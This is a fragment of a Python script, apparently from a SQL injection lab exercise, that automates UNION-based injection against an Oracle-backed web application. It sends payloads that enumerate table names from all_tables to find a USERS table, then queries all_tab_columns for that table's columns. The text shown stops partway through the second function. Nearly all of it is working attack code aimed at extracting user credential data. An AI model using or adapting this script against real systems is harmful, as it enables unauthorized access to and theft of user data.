...
def get_table_name(url, middle_part):
    payload = f"'UNION SELECT table_name" + middle_part + "from all_tables--"
    request = requests.get(url + uri + payload, verify=False, proxies=proxy)
    res = request.text
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(string=re.compile(r'^USERS.*'))
    if users_table:
        return users_table
    else:
        return False
...
def get_users_columns(url, middle_part):
    payload = f"'UNION SELECT column_name" + middle_part + f"from all_tab_columns where (table_name='{get_table_name(url,middle_part)}')--"
    request = requests.get(url + uri + payload, verify=False, proxies=proxy)
    res = request.text
    soup = BeautifulSoup(res, 'html.parser')
